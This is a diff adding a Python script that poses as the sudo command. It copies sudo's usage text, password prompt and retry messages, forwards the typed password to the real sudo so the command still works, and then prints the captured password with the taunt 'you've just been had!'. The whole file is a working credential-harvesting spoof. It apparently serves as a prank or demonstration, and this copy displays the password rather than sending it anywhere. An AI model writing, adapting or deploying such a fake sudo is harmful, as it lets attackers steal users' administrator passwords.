@@ -1,0 +1,52 @@
+#!/usr/bin/python3
+import os
+import sys
+import argparse
+import subprocess
+from time import sleep, time
+from getpass import getpass
+
+def main():
+    if len(sys.argv) < 2:
+        print("usage: sudo -h | -K | -k | -V")
+        print("usage: sudo -v [-AknS] [-g group] [-h host] [-p prompt] [-u user]")
+        print("usage: sudo -l [-AknS] [-g group] [-h host] [-p prompt] [-U user] [-u user] [command]")
+        print("usage: sudo [-AbEHknPS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt] [-T timeout] [-u user] [VAR=value] [-i|-s] [<command>]")
+        print("usage: sudo -e [-AknS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p prompt] [-T timeout] [-u user] file ...")
+        return
+    global attempts
+    attempts = 0
+    global nowtime
+    argzz = sys.argv
+    del argzz[0]
+    arguments = ["/usr/bin/sudo", "-S"]
+    for item in argzz: arguments.append(item)
+    while attempts is not 3:
+        passwd = getpass("[sudo] password for " + os.environ["USER"] + ": ")
+        attempts += 1
+        p = subprocess.Popen(arguments, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.STDOUT)
+        output = p.communicate(input=str.encode("{}\n".format(passwd)))
+        opt = output[0].decode("utf-8")
+        if "Sorry, try again" not in opt:
+            print()
+            print(str(opt))
+            print("you've just been had! " + passwd)
+            return
+        if attempts is not 3: print("Sorry, try again.")
+    print("sudo : " + str(attempts) + " incorrect password attempts")
+    print("you've just been had! " + passwd)
+
+if __name__ == "__main__":
+    try:
+        main()
+    except KeyboardInterrupt:
+        if attempts == 1:
+            print("\nsudo: " + str(attempts) + " incorrect password attempt")
+        elif attempts > 1:
+            print("\nsudo: " + str(attempts) + " incorrect password attempts")
+        else:
+            print()
+        try:
+            sys.exit(0)
+        except SystemExit:
+            os._exit(0)
